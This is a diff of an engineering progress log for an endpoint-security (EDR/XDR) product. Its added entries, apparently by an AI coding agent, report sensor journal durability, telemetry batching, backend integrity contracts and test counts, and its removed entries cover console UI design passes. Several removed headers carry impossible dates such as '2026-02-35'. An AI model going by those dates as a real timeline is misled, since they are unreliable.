+on it, raising `TypeError` the moment a COLLECTION-scoped exclusion actually matched
+(masked because `0 or []` yields `[]`).
+
+**Tests — 57 NEW, all pass; `backend/tests/edr/` full suite 1885 passed / 3 skipped**
+- `fixtures_b5_gap1_source.py` — deterministic circular-channel harness (no wevtutil,
+  no HTTP, no endpoint; all TEST/SYNTHETIC).
+- `test_b5_gap1_paged_acquisition.py` (24) — paging 0/1/99/100/101/200/201/1000/10000,
+  page-size + `/rd:false` argv assertion, per-channel ceiling as a PAUSE not a skip,
+  gap matrix incl. the production 26409 case, fairness, channel-failure isolation.
+- `test_b5_gap1_journal_durability.py` (28) — crash cases A-E with a genuinely
+  read-only connection (not a mock), corruption quarantine, delivery
+  normal/slow/down/retry/recovery/ordering, pressure + halt + live-bytes capacity,
+  identity/tenant/credential-absence, EID1+EID5 with ProcessGuid and
+  provider-qualified counting through the journal, migration idempotency.
+- `test_b5_gap1_stress_and_silent_loss.py` (5) — §23 stress 10,000 (acquired ==
+  journaled == accepted == 10000, 0 gaps, 0 duplicates), §24 failure injection
+  (1,500 records/cycle x 8 cycles against a trickling backend: backlog GROWS, zero
+  gaps, zero loss), rotation declared not hidden, rollover risk measured not deduced,
+  and a **pre-fix counterfactual** reproducing 100 -> 26,410 jump -> 100 then proving
+  the fixed path takes all 26,609.
+- Synthetic throughput (NOT a production claim): ~28,900 acquire/s, ~615 deliver/s.
+
+**Remaining risks (full list in the doc)**
+1. Acquisition integrity not visible in the console — needs an approved backend
+   contract. 2. `wevtutil` scan cost still unproven in production; now measured.
+3. **Delivery is still ~11 msgs/cycle at 2.68 s/POST — a 20 rec/s endpoint holds a
+   growing journal backlog; 512 MiB ~= 270,000 records ~= 3.7 h of headroom before
+   JOURNAL_PRESSURE. This makes backlog Issue 2 (telemetry POST latency/batching) the
+   next production-critical item.** 4. B3 file hashing still inside acquisition
+   (capability-gated OFF; surfaces as ACQUISITION_LAGGING). 5. Tail probe adds 6 cheap
+   wevtutil calls/cycle (disableable). 6. The historical B5-GAP-1 records remain
+   unrecoverable — nothing backfills or reconstructs them, by design. 7. Not yet
+   exercised on real Windows; the frozen bundle must be rebuilt so `sqlite3` is packed.
+
+**Files:** `agents/nivxforge-windows/nivxforge_journal.py` (new),
+`nivxforge_sensor.py` (0.2.0 -> 0.3.0-windows), `build/build_windows_installer.ps1`
+(`--hidden-import nivxforge_journal`, `sqlite3`), 4 new test files,
+`/app/docs/B5_GAP_1_ACQUISITION_DURABILITY_FIX.md`.
+No backend route/model/tenancy/response-authority/Device-Trajectory change. E3 NOT
+STARTED. No deploy, no endpoint contact, no sensor restart, no Sysmon or channels.json
+or outbox change, no replay, no backfill.
+
+### Next (owner-gated)
+- P0: owner approval -> Windows build -> canary acceptance (procedure §25 of the doc).
+- P0: telemetry POST latency / batching (backlog Issue 2) — now the binding constraint
+  on delivery, and the reason the journal backlog grows.
+- P1: approved backend contract to publish ACQUISITION_GAP + integrity to the console.
+- P1: E3 deterministic detection engine hardening (after the above).
 
 ---
 
-## ✅ 2026-02-35 · P0.0 Navigation IA · P0.1 Truthful Capability Pages · SHIPPED
+## 2026-06 · B5-GAP-1 PRE-PRODUCTION HARDENING · GATES A-D
+### GATES B/C/D PASS · GATE A WIRED BUT NOT RUN (needs a Windows runner) · **NOT DEPLOYED**
 
-The XDR SPA sidebar is now restructured around the analyst mental
-model and every "Coming Soon" placeholder is replaced with an
-enterprise-grade honest zero-state capability contract.
+Record: `/app/docs/B5_GAP_1_PREPROD_HARDENING_GATES_A_D.md`. `DESKTOP-A9HGFJJ`
+untouched (no install, no restart, no Sysmon/channels.json/outbox change, no
+replay, no backfill). B5 remains CLOSED/PASS. Owner review gate open.
 
-**Locked sidebar IA** (owner-locked, `/app/apps/nivxray-xdr/src/xdr/XdrShell.jsx`)
+**GATE A — WINDOWS_ARTIFACT_BUILD = NOT_RUN (blocked, not failed).** PyInstaller
+cannot cross-compile a Windows PE from Linux; `windows-sensor-installer.yml` runs on
+`windows-latest` and there is no Windows runner in this workspace. Instead the
+artifact now proves the journal ABOUT ITSELF: NEW frozen CLI subcommand
+`NivXForgeEDRSetup.exe journal-selftest` (`nivxforge_setup.journal_selftest`) checks
+sqlite3 importable + library version, `nivxforge_journal` importable, DB create/open,
+`PRAGMA journal_mode=wal`, `PRAGMA synchronous==2`, `auto_vacuum==2`, all five tables,
+durable commit, cursor commit, replay idempotency, integrity snapshot, gap contract.
+Wired as **ACCEPTANCE GATE 0** in the Windows workflow and it REQUIRES `"frozen": true`
+so a system-Python pass can never be mistaken for an artifact pass. Verified locally:
+`result: PASS`, `frozen: false` (honest — not the frozen binary). Gate wiring is itself
+under test. Items 9/10 PASS by inspection: sqlite3 is stdlib, requirements/pip list/
+spec/signing/ACL/service definition all unchanged; only two `--hidden-import` flags
+added. **To close Gate A: one Windows CI run.**
 
+**GATE B — DELIVERY_ROOT_CAUSE = PROVEN. THREE causes, measured not assumed**
+(`scripts/b5gap1_delivery_latency_probe.py`, live preview ingress + loopback, enrolled
+synthetic endpoint):
+  fresh connection per POST (pre-fix sensor) 176.6 ms = **5.7 ev/s**
+  one persistent connection, 1 event/POST    103.3 ms = **9.7 ev/s**
+  loopback 1 event/POST (backend+DB only)     38.6 ms = 25.9 ev/s
+  batch 10 / **batch 50** / batch 100        43.1 / **48.3** / 33.5 ev/s
+Decomposition per event pre-fix: DNS+TCP+TLS ~73 ms (41%, discarded every event) +
+ingress/WAN ~65 ms (37%, paid per event) + backend/auth/Mongo ~39 ms (22%,
+irreducible). **Batch default = 50, chosen from measurement**: past ~50 amortisation is
+spent, server per-event work dominates, and batch 100 is WORSE (33.5 ev/s) on a 3.0 s
+request with more ingress-timeout exposure. `MAX_BATCH_EVENTS=100` server cap retained.
+DELIVERY_THROUGHPUT = 48.3 ev/s = 2.4x the ~20 ev/s source → DELIVERY_SUSTAINABILITY
+PASS. **CAVEAT: preview numbers. Production was 2.68 s/POST (~15x worse); the absolute
+ceiling must be RE-MEASURED on the canary — it is step 3 of the acceptance procedure,
+not an assumption.**
+- Sensor: NEW `_Transport` (one persistent `http.client` connection, reconnects ONCE on
+  a stale socket so it is not mistaken for an outage), `_post`/`_get` routed through it,
+  `_deliver_batch`, batch-aware `_drain_journal` (404/405 → permanent single-event
+  fallback; 413 → halve batch; 401/403 → refresh session), `BATCH_SUPPORT`.
+- Backend: `_ingest_one` extracted so single-event and batch share ONE ingest path
+  (asserted by test); NEW `POST /api/edr/agent/telemetry/batch`.
+- **DURABILITY NOT WEAKENED. `SENT != ACCEPTED` survives batching**: the response is an
+  ORDERED PER-EVENT verdict, never a batch verdict; only accepted indices are released.
+  Proven E2E — 59 of 60 released, exactly the refused one retained, 0 duplicates.
+  Idempotency INHERITED from `raw.append` `(tenant_id, dedup_key)`, no new identity
+  scheme. 413 ingests nothing so the endpoint still owns everything. Liveness recorded
+  once per batch, and not at all if nothing was accepted.
+
+**GATE C — INTEGRITY_BACKEND_CONTRACT = PASS · BACKWARD_COMPATIBILITY = PASS.**
+`HeartbeatBody`/`TelemetryBody` NOT touched (both `extra="forbid"`; adding fields would
+422 the whole fleet) — asserted by test. NEW `backend/edr_plane/acquisition_integrity.py`
++ `POST /api/edr/agent/acquisition-integrity` (SENSOR_SCOPED, own versioned contract) +
+`GET /api/edr/enrollment/acquisition-integrity` (TENANT_SCOPED read). All three routes
+classified in `ROUTE_CLASSIFICATION` (the matrix fails closed on an unclassified route).
+Neither new body carries tenant_id/endpoint_id — identity from the authenticated session.
+**The semantic chain is SERVER-ASSERTED, not trusted.** Proven LIVE through the real
+ingress: a sensor claiming `classification: MALWARE_EVASION`, `cause: LOG_ROLLOVER`,
+`missing_record_id_count: 999999`, health `TOTALLY_FINE` was stored as
+`SOURCE_RECORD_DISCONTINUITY` / `NOT_PROVEN` / `is_detection: false` / recomputed
+**26409** / health `[ACQUISITION_GAP, DELIVERY_BACKLOG]` / `claim_basis:
+SENSOR_REPORTED`. Every gap carries its own absence semantics (not benign, not
+malicious, not a detection, no-event-observed != did-not-occur). Gaps append-only and
+idempotent; the sensor marks a gap reported ONLY after the platform has it. No console
+or Device Trajectory work.
+
+**GATE D — all nine PRE_CANARY scenarios PASS**
+(`test_b5_gap1_pre_canary_acceptance.py`, full cycle against a fake backend running the
+REAL batch + integrity contracts): NORMAL, BURST (3,000 in one opportunity, 7+ pages),
+BACKEND_SLOW (backlog grows, next cycle still journals 1,000), BACKEND_DOWN (500 held,
+sent 0, acquisition continues), RECOVERY (600/600, 0 duplicates), RESTART, GAP (26,409
+declared, reaches platform, reported once, nothing invented), MULTI_CHANNEL (hot Sysmon
+5,000 does not starve Security/System), PRESSURE (halts, keeps every unacknowledged row,
+AND recovers). Plus partial refusal, batch-route-absent fallback, oversize halving, and
+transport reuse/reconnect. Ownership is asserted as the UNION of still-journaled and
+backend-accepted, because accepted rows are reclaimed.
+
+**Tests: 89 B5-GAP-1 tests (24+28+5+16+16). Full `backend/tests/edr/`: 1917 passed,
+3 skipped, 0 failed.**
+
+**A REAL FAULT THE EXISTING SUITE CAUGHT:**
+`test_p0prod2_enrollment_hardening::test_agent_routes_never_depend_on_a_platform_user`
+failed because the admin read route was first placed INSIDE the agent block of
+`edr_enrollment.py`, where that guard scans for `get_current_user`. Admin identity must
+not appear in the agent surface — the route was moved above the agent section. The guard
+was right.
+
+**Remaining risks:** (1) Gate A needs one Windows CI run. (2) Production throughput
+unmeasured — 48.3 ev/s is preview. (3) **Server-side per-event cost ~39 ms is now the
+ceiling; if the canary needs >~25 ev/s per endpoint the next lever is inside
+`_ingest_one` (2-4 counter writes/event look batchable), NOT the transport.** (4)
+Integrity stored but not rendered (no console work, by instruction). (5) Batch fallback
+is permanent for the process once a 404 is seen. (6) Two synthetic endpoints
+(`ep_1badb6e4ec82b016f808`, `NIVX-PROBE-2`) now exist in the PREVIEW db, tenant
+`probe-t-00bf71`, from the probe and the live contract check — revoke at will. (7)
+Historical B5-GAP-1 records remain unrecoverable, by design.
+
+### Next (owner-gated)
+- P0: run `windows-sensor-installer.yml` on a Windows runner → close Gate A.
+- P0: one-endpoint canary per §"PROPOSED ONE-ENDPOINT CANARY PROCEDURE" — step 3
+  re-measures production delivery throughput.
+- P1: if the canary needs more throughput, batch the per-event delivery-counter writes
+  inside `_ingest_one`.
+- P1: render acquisition integrity / gaps in the console.
+- P1: E3 deterministic detection engine hardening (after the above).
+
+---
+
+## 2026-06 · B5-GAP-1 WINDOWS ACCEPTANCE GATE 0 + §5 INGEST COST PROFILE
+### FROZEN SELFTEST PASS (Linux bundle) · PACKAGING_REGRESSION PASS · COUNTER_PROFILE COMPLETE
+### WINDOWS_ARTIFACT_BUILD = NOT_RUN · CANARY_STARTED = NO · **PRODUCTION_DEPLOYED = NO**
+
+Record: `/app/docs/B5_GAP_1_WINDOWS_GATE0_AND_COST_PROFILE.md`. `DESKTOP-A9HGFJJ`
+untouched (no install, no restart, no Sysmon/channels.json/outbox change, no journal
+migration, no generated load, no canary). B5 remains CLOSED/PASS.
+
+**TWO HARD LIMITS, STATED NOT HIDDEN.** (1) I cannot trigger CI — git write actions go
+through the chat's "Save to Github" control; no tool can start `windows-sensor-installer.yml`.
+(2) PyInstaller cannot cross-compile a Windows PE from Linux. So
+`WINDOWS_ARTIFACT_BUILD = NOT_RUN`: blocked, not failed, not faked. **The Windows run is
+the owner's to trigger and is the ONLY outstanding Gate 0 item.**
+
+**FROZEN SELFTEST = PASS, in a REAL frozen binary.** Built an actual PyInstaller
+**onefile** ELF using **PyInstaller 6.11.1 — the exact version pinned in
+`build_windows_installer.ps1`** and the same hidden-import set minus `win32*`, then ran
+`NivXForgeEDRSetup-linuxproof journal-selftest` FROM THE BINARY (not Python):
+`result: PASS`, **`frozen: true`**, sqlite3 importable (lib 3.40.1), journal module,
+DB create/open, `wal_mode`, `synchronous_full`, `auto_vacuum_incremental`, five tables,
+durable commit, cursor commit, replay idempotency, integrity snapshot, gap contract —
+all 13 TRUE, exit 0. Byte scan confirms `_sqlite3` (native ext), `sqlite3` and
+`nivxforge_journal` are packed.
+- PROVES: the freeze mechanism, the hidden-import list, `sys.frozen` detection, that
+  PyInstaller 6.11.1 packs stdlib sqlite3 + its native extension with no extra hook, and
+  that WAL/FULL/INCREMENTAL behave inside a bundle.
+- DOES NOT PROVE (and not claimed): the Windows bootloader, `_sqlite3.pyd`/`sqlite3.dll`,
+  NTFS, or the Windows SERVICE context (LocalSystem, `C:\ProgramData` ACLs).
+  **SQLite inside the shipped PE remains genuinely unproven.**
+- ARTIFACT_SHA256 for the real artifact DOES NOT EXIST YET — it comes from the Windows
+  run. The Linux proof binary was built to /tmp and is disposable; it is NOT shippable.
+  Not signed (Authenticode is inapplicable to an ELF). No signing secret was read.
+
+**PACKAGING_REGRESSION = PASS, proven by diff vs the reviewed baseline `6afab68a`:**
+`Install-NivXForgeSensor.ps1` **byte identical (no diff at all)**;
+`build/build_windows_installer.ps1` **+2/-0** (only the two `--hidden-import` lines);
+`nivxforge_setup.py` **+75/-0** (pure addition — the selftest);
+`backend/requirements.txt` **byte identical**. **Zero deletions and zero modified lines
+anywhere.** Therefore unchanged: service identity, service permissions, installer ACLs,
+state-dir ACLs, auth-material handling, enrolment, tenant binding, startup command,
+backend origin, signing. Also guarded by the three green installer suites. PyInstaller
+was installed in THIS CONTAINER ONLY and deliberately NOT added to requirements.txt.
+
+**§5 COUNTER PROFILE COMPLETE — THE COUNTER HYPOTHESIS WAS WRONG.**
+Real local Mongo + pymongo `CommandListener`, warmed to steady state, measure-only:
 ```
-WORKSPACE          Analyst Workspace
-COMMAND CENTER     MSS Dashboard
-OPERATIONS         Incidents · My Queue · SLA/Aging · Response
-INVESTIGATIONS     Investigation Workspace · Evidence Explorer · Entity Search · Attack Story
-DETECT             Rule Studio · Detection Registry · Correlation Rules · Detection Engineering
-INTELLIGENCE       Threat · IOC · Command · Malware · MITRE ATT&CK · Knowledge Base
-DATA               Security Data Lake · Telemetry Studio · Telemetry Health
-RESPOND            Playbooks · Automation Rules · Approvals Queue
-EXPOSURE           Assets · Vulnerabilities · Vulnerability Exposure · Attack Paths · Critical Assets
-ADMINISTRATION     Integrations · Data Sources · Collectors · Agents · Parsers · Normalization ·
-                   Detection Rules · Response Policies · Users/Roles · API/Webhooks
-SYSTEM             Platform Health · Documentation
+ingest per accepted event   30.3 ms | 19 Mongo commands | 24.6 ms in Mongo (81.4%)
+                                    | 5.7 ms CPU (18.6%)
+DELIVERY-COUNTER WRITES      3 of 19 commands = 1.25 ms = 3.8% of ingest
+canonical bridge            30.7 ms (~90%) | raw.append 1.01 | mark_reported 0.49
+                                            | get_endpoint 0.42
 ```
-
-Key moves (from prior IA):
-- **Detection Rules** moved to Administration (governance/config).
-  Rule Studio stays in Detect (authoring).  Distinction locked.
-- **Parsers / Normalization** moved to Administration (infrastructure).
-- **Vulnerability Exposure** moved out of Intelligence → Exposure.
-- **Telemetry Studio / Telemetry Health** moved out of Administration → Data.
-- **Platform Health / Documentation** moved out of Admin/Intelligence → System.
-- **Analyst-first ordering**: OPERATIONS → INVESTIGATIONS → DETECT →
-  INTELLIGENCE → DATA → RESPOND → EXPOSURE, then Administration/System
-  at the bottom.
-
-**Truthful capability pages** (`XdrReservedPage.jsx` rewritten)
-
-Every previously-"Coming Soon" surface (Threat Intel, IOC Intel,
-Command Intel, Malware Intel, MITRE, Knowledge Base) now renders:
-
-1. `AdminHero` with capability-specific eyebrow › title › subtitle ›
-   `STATUS · NOT CONFIGURED` provenance.
-2. Real zero-count metrics (Sources · Indicators · Enrichments ·
-   Watchlists · Sightings) — every "0" is authoritative, dim-styled.
-3. Amber `STATUS · NOT CONFIGURED` panel with the actual reason
-   ("No intelligence sources are configured for this tenant.")
-   and a real CTA that navigates to the wiring page
-   (`/xdr/admin/integrations`, `/xdr/admin/collectors`, etc.).
-4. **Capability Contract** card declaring `Consumes` /
-   `Produces` / `Requires` in machine-readable terms — this is the
-   surface that Round 2's P0.2c work will feed from.
-5. Honest footer: "No metric on this page is fabricated. Every '0'
-   is an authoritative zero from the backing service."
-
-**Round 1 (Admin Convergence) still shipped** — `AdminHero` +
-`PipelineStrip` applied to all 8 admin surfaces (Overview · Engines ·
-Collectors · Data Sources · Integrations · API Keys · Webhooks ·
-Users & Roles), all reading real backend counts.
-
-**Deploy note** — every change is in `/app/apps/nivxray-xdr/` (the
-XDR SPA that deploys separately to `https://nivxray-xdr.vercel.app`).
-The `greeting-app-5782.preview.emergentagent.com` preview URL only
-serves the base NivXRay Tool; XDR changes require a Vercel redeploy
-(Save-to-GitHub → auto-deploy) to become visible in production.
-
----
-
-## 🔜 Round 2 — P0.2 Detection Content Fabric (dependency order)
-
-Locked sequence with the correct architectural discipline:
-
-```
-P0.2c Implementation Capability Contracts  ← START HERE
-        │  describe all 329 implementations · classify honestly
-        │  detection = false (default) · runtime-verify to promote
-        ▼
-P0.2b Strict pySigma Parse
-        │  pySigma is the authoritative parser
-        │  parse/compile errors preserved · never silently accepted
-        ▼
-P0.2d Rule ↔ Capability Matching (deterministic)
-        │  compatible engines identified per rule
-        │  unmatched rules → ENGINE_UNBOUND (a first-class product state)
-        ▼
-P0.2e Detection Execution Harness
-        │  one Sigma rule end-to-end · positive fixture DETECTED
-        │  negative fixture NOT DETECTED · then EXECUTION_READY
-        ▼
-P0.2f Full SigmaHQ Ingest
-        │  gated: 1 rule → 10-20 → 100 → 3,000+
-        ▼
-Authoritative Detection Capability Coverage Report
-```
-
-**Contract status ladder** (owner-locked · never auto-promoted):
-`DISCOVERED → CONTRACT_PENDING → CONTRACT_DECLARED →
-RUNTIME_VERIFIED → EXECUTION_VERIFIED`
-
-**Non-negotiable rule** — Do NOT reclassify any of the 13 ANALYZERs
-/ 62 DECODERs / 25 INTELLIGENCE_ENGINEs as DETECTION_ENGINEs just
-to make Sigma rules bind.  `DETECTION_ENGINE = 0` is a valuable,
-honest finding.  P0.2c must determine whether any existing module
-genuinely satisfies a detection-execution contract; if none does,
-the Binding Matrix will honestly report `ENGINE_UNBOUND` for every
-Sigma rule that has no compatible engine.
-
----
-
-## ✅ 2026-02-35 · Admin Control Plane Convergence (Round 1) · SHIPPED
-
-Every admin surface in `/app/apps/nivxray-xdr/src/xdr/admin/` now
-converges on the Detection Registry visual grammar while surfacing
-100% authoritative backend state — no fabricated counts.
-
-**Two new shared primitives**
-- `AdminHero.jsx` — canonical page header (eyebrow › title ›
-  subtitle › source-provenance › right-side actions › up-to-6 stat
-  cards).  A stat with `value === 0` renders in `--faint` so honest
-  zero states never LOOK like fake populated data.
-- `PipelineStrip.jsx` — visualises the ingestion pipeline
-  `Integrations → Data Sources → Collectors → Parsers → Normalizers
-  → Canonical Evidence`.  Each stage's count is pulled from the
-  authoritative admin API for that resource; stages without a
-  backend (`Parsers`, `Normalizers`) render dashed + `PENDING` —
-  the UI will never invent one.
-
-**Converged surfaces (`AdminHero` applied · real backend counts)**
-| Surface        | Authoritative source                | Real state today |
-|----------------|-------------------------------------|------------------|
-| Overview       | `/admin/stats` + `PipelineStrip`    | Live KPIs · pipeline mostly NOT CONFIGURED |
-| Engines        | `/admin/content-supply-chain/engines/report` | 329 · 0 DETECTION_ENGINE · all DISCOVERED |
-| Collectors     | `/xdr/collectors`                   | 0 configured · 3 protocols impl · 9 scaffold |
-| Data Sources   | `/xdr/data-sources`                 | 0 configured · 16 kind templates |
-| Integrations   | `/xdr/collector/*` + `/xdr/health/outbox` | COLLECTOR RUNTIME NOT DEPLOYED |
-| API Keys       | `/xdr/api-keys`                     | 0 provisioned |
-| Webhooks       | `/xdr/webhooks`                     | 0 configured |
-| Users & Roles  | `/xdr/rbac/*`                       | 0 users · 10 system roles · 2 custom · 142 perms |
-
-**Verified live**
-- `vite build` clean · 268 kB `XdrAdminPage-*.js`.
-- 8 acceptance screenshots taken against local `vite preview`
-  proving every hero renders with honest counts and every empty
-  state reads as intentional design, not developer scaffold.
-
-**Round 1 acceptance rule preserved**
-- Zero engines/capabilities/bindings/states were invented to make
-  the UI look better.  Every "0" on screen is a real "0" the
-  backend reported.
-
----
-
-## ✅ 2026-02-35 · Phase A.2 · Visual Maturity Layer · Queue composition · SHIPPED
-
-Commit `bbab9c8` — 5 files, +224 / -20.  Live at
-`https://nivxray-xdr.vercel.app/xdr/incidents` after Vercel deploy.
-
-**Materiality tokens (`nx-tokens.css`)**
-- 5-surface system: Canvas (`#F4F3F0`) · Primary (`#FFFFFF` +
-  `shadow-1`) · Raised (`#FFFFFF` + `shadow-2`) · Inset (`#FAFAF8`)
-  · Selected (`--nx-purple-dim`).  `.nx-canvas` / `.nx-primary` /
-  `.nx-inset` / `.nx-raised` / `.nx-selected` helpers.
-
-**NxHeroHeader primitive**
-- Renders eyebrow → H1 title → one-line description → integrated
-  attention metrics (numeric + label, optionally clickable) →
-  right-side action + quiet provenance.  NOT a KPI card wall.
-
-**Queue composition pass**
-- Table becomes the focal point (Primary surface, `shadow-1`).
-- KPI strip drops from bordered cards to left-border-only inline
-  text — subordinate.
-- Toolbar + chips + tabs move onto Inset surface.
-- Canvas is warm neutral (no more white-inside-white).
-- Incident names use human sans; technical identity stays mono.
-- Provenance quieted to `--nx-faint`.
-
-**Contracts unchanged** — engine lock, anti-fabrication.
-
-**Sequenced plan (locked)**
-- A.2 · Queue → **SHIPPED**
-- A.2 · Incident Record → next
-- A.2 · MSS Dashboard
-- A.2 · Rule Studio
-- A.2 · KB / Threat Intelligence
-- B.5 · Cross-screen coherence pass
-
-Phase 3/4 remain paused.
-
----
-
-## 🟠 2026-02-34 · Visual Maturity Layer · design lock (feature freeze)
-
-Owner reviewed the shipped Queue/Rule-Studio screenshots and
-called out the correct diagnosis: NivXRay is grammar-compliant
-but *composition-poor*.  The product currently reads as *drawn
-on a page* rather than *built as an application*.
-
-**The missing ingredient is not colour or grammar — it is
-surface materiality + hierarchy + interaction.**
-
-**Feature work is frozen.**  Next milestone is a dedicated
-"Visual Maturity / Surface Composition" pass across
-Queue → Incident Record → MSS Dashboard → Rule Studio → KB →
-Response.  Phase 3 (Lifecycle/SLA) and Phase 4 (Auto-
-Investigation provenance) remain paused.
-
-**Deliverable produced this checkpoint (no code)**
-- `/app/memory/NIVXRAY_VISUAL_GRAMMAR.md` §16 · Phase A.2
-  Visual Maturity Layer.  Locks:
-  - 16.1 · The 10-layer visual stack (Shell · Canvas ·
-    Surfaces · Hierarchy · Semantic colour · Interaction ·
-    Typography · Density · Motion · Composition).
-  - 16.2 · **Visual gravity** hierarchy (Action → Attention →
-    Investigation → Evidence → Context → Metadata) as the
-    missing composition concept.
-  - 16.3 · Surface materiality — 5 surfaces (Canvas · Primary ·
-    Raised · Inset · Selected) with locked tonal depths, no
-    white-inside-white nesting.
-  - 16.4 · Two typographic voices (human + technical) instead
-    of one monospace "developer console" voice.
-  - 16.5 · Hero information rule — every page answers *what am
-    I looking at · what is important · what can I do* in the
-    first 5 seconds.
-  - 16.6 · Interaction residue — the app looks responsive even
-    when idle.
-  - 16.7 · NivXRay personality locked as *evidence-grade
-    precision*, expressed through 11 visual rules.
-  - 16.8 · Materiality acceptance test — every screen must pass
-    §14 + §15 + §16 before it ships.
-
-**Implementation plan (next turn, single dedicated pass)**
-1. Extend `nx-tokens.css` with the 5-surface materiality
-   tokens (Canvas · Primary · Raised · Inset · Selected).
-2. Introduce a Hero Header primitive rendering the first-5-
-   seconds strip (title · one-line description · attention
-   numbers).
-3. Enforce two typographic voices in the queue: human sans for
-   titles, mono for identity/IOC/timestamp values only.
-4. Apply visual gravity per-screen: identify the focal point,
-   raise the surrounding surfaces to Primary, drop supporting
-   sections to Inset, dim metadata to `--nx-faint` mono.
-5. Ship interaction residue: row-hover `→` glyph, chip hover
-   tooltips, richer selected-nav-item, focus rings audit.
-6. Cross-screen materiality pass on Queue → Record → MSS →
-   Rule Studio → Threat Intel to verify §16.8 acceptance.
-
----
-
-## ✅ 2026-02-34 · Phase B.1 · Queue acceptance · SHIPPED
-
-Grammar §15 (Enterprise Refinement Layer, rules R1-R11) is now
-locked as a release criterion.  The Queue is the first screen
-taken through acceptance against §14 + §15.  Live at
-`https://nivxray-xdr.vercel.app/xdr/incidents`.
-
-Commit `923793f` — 3 files, +148 / -6.
-
-**Grammar addendum**
-- `/app/memory/NIVXRAY_VISUAL_GRAMMAR.md` §15 · Phase A.1
-  Enterprise Refinement Layer.  11 rules: R1 tonal depth · R2
-  deliberate density · R3 typography hierarchy · R4 monospace
-  discipline · R5 rows as instruments · R6 purple has one
-  meaning · R7 evidence-first is composition · R8 empty is
-  intentional · R9 restrained motion · R10 attention hierarchy ·
-  R11 cross-screen coherence.
-
-**Queue refinements**
-- R2 KPI tile density: tighter padding, 22 px count as primary
-  read, provenance line dim + smaller.
-- R5 row instrument states: subtle `#F9FAFB` hover tint;
-  selected + previewed rows carry a 3-px purple left rail +
-  `--purple-dim` wash + purple `→` glyph anchor on the right
-  edge showing which row drives the peek drawer.
-- R3 incident-name typography 600 12.5 px sans -0.1px carries
-  row hierarchy.
-- R6 focus rings limited to purple ring token.
-- R9 restrained 120 ms transitions.
-- Sorted column adopts 2-px purple bottom border.
-- Sort marker chip `SORTED BY <col> · ↓` with Reset appears
-  above the table when sort ≠ default; sort state is now
-  discoverable, not implicit.
-- Evidence-first cell drill (grammar §9 R7): customer +
-  detection_source cells wrapped in `NxLink`; clicking filters
-  the queue on that dimension.  Missing values keep rendering
-  as dashed honesty chips.
-
-**Contracts unchanged** — engine lock, anti-fabrication.
-
-**Sequenced plan (locked)**
-- B.1 · Queue → **SHIPPED (this checkpoint)**
-- B.2 · Incident Record → next
-- B.3 · MSS Dashboard operational rebuild
-- B.4 · MITRE + Evidence
-- B.5 · Cross-screen polish pass
-
-Phase 3 (Lifecycle/SLA) and Phase 4 (Auto-Investigation
-provenance) remain paused until B.1-B.5 pass acceptance.
-
----
-
-## ✅ 2026-02-34 · Phase B · Nx primitives + Queue grammar rebuild · SHIPPED
-
-Phase B ships the grammar in code and adopts it on the Queue as
-the first grammar-benchmark screen.  Live at
-`https://nivxray-xdr.vercel.app/xdr/incidents`.
-
-Commit `55e6c3d` — 17 files, +793 / -160.
-
-**Primitives (`src/xdr/nx/`)**
-- `nx-tokens.css` — five-surface palette, nine-role type ramp,
-  semantic colour systems, density tokens (Comfort · Compact),
-  chip + provenance + IKG + empty + skeleton grammar.
-- `NxChip` + `NxHonestyChip` — §5 truth-state grammar enforced in
-  one place.  `variant=filled|tinted|dashed`; dashed is locked
-  for honesty states.
-- `NxProvenance` — §6 selective `Source · …` sub-line.
-- `NxLink` — §9 evidence-first navigation edge.
-- `NxIkgGlyph` — §7 renders only when `linked=true`.
-- `NxExecPulse` — §8 execution-state pulse (backend-flagged only).
-- `NxEmpty` + `NxSkeleton` — §11 empty / loading grammar.
-- `NxDensityProvider` + `useNxDensity` — §12 two-mode density,
-  persists as `data-density` on `.xdr-console`.
-
-**Grammar enforcement in one place**
-- `components/chips/index.jsx` rewritten to delegate to `NxChip`.
-  Every existing chip (Priority · Severity · Verdict · State ·
-  SideState · Domain) inherits §5 without callsite changes.
-
-**Queue as grammar benchmark**
-- `QueueTable` — `NOT_RUN` / `NO EVIDENCE` / `UNKNOWN` cells render
-  as dashed honesty chips (not faded gray text).  Auto-Investigation
-  status renders as a tinted chip with a pulsing dot for `RUNNING`.
-- `QueueToolbar` — Comfort ↔ Compact density toggle wired to
-  NxDensity.
-- `PriorityStrip` — selective provenance sub-line under each
-  non-empty count (`Source · workspace_cases.live`).
-- `IncidentPreviewDrawer` — position counter `1 of 2`.
-- `queue-theme.css` — density bindings on compact rows.
-
-**Contracts unchanged** — engine lock, anti-fabrication.
-
-**Next in the sequenced plan** (locked in gap analysis §A14)
-Queue continues → Incident Record → MSS Dashboard → MITRE →
-Evidence.  Then and only then, Phase 3 (Lifecycle/SLA) and Phase
-4 (Auto-Investigation provenance) start.
-
----
-
-## 🟠 2026-02-34 · Enterprise Visual System · re-scoped
-
-Owner reviewed the "Enterprise Visual System v1" screenshots and
-called out that the pass had drifted back into "change background
-colour" territory rather than delivering a coherent enterprise
-visual system.  The prior v1 pass is treated as an intermediate
-milestone, not visual acceptance.
-
-**Direction reset**
-- Do not proceed to Phase 3 (Lifecycle/SLA) or Phase 4
-  (Auto-Investigation provenance) until the visual system is
-  genuinely operational and acceptance-tested against the
-  Defender + SIR pattern set.
-- Study interaction patterns, not screenshots.
-- Establish visual grammar before writing any `Nx*` component.
-
-**Deliverables produced (this checkpoint · no code)**
-- `/app/memory/NIVXRAY_ENTERPRISE_UX_GAP_ANALYSIS.md` (v1.1) —
-  15-area gap analysis, owner amendments A1–A14, sequencing lock
-  Queue → Record → MSS Dashboard → MITRE → Evidence.
-- `/app/memory/NIVXRAY_VISUAL_GRAMMAR.md` (v1) — locked
-  specification.  14 sections: surfaces, hierarchy, type ramp,
-  colour system, truth-state chip grammar, provenance grammar,
-  IKG affordance, execution-state pulse, evidence-first
-  interaction, interaction states, empty/reserved grammar,
-  density, component consequences, grammar acceptance test.
-
-**Locked NivXRay visual signatures** (five)
-1. Selective evidence provenance.
-2. Truth-state chips (filled = observed · dashed = absent /
-   uncertain / not-run).
-3. IKG relationship affordance (backend-flagged entities only).
-4. Execution-state pulse (backend-flagged execution only).
-5. Evidence-first interaction — decision-critical values are
-   navigation edges back to evidence.  **Strongest
-   differentiator.**
-
-**Next**
-Awaiting owner sign-off on the grammar before implementation.
-On sign-off, Phase B builds a small `Nx*` primitive library that
-implements the grammar, then Queue → Record → MSS → MITRE →
-Evidence receive individual visual passes that must pass the
-grammar acceptance test in §14 of the grammar document.
-
----
-
-## ✅ 2026-02-34 · Enterprise Visual System v1 · SHIPPED
-
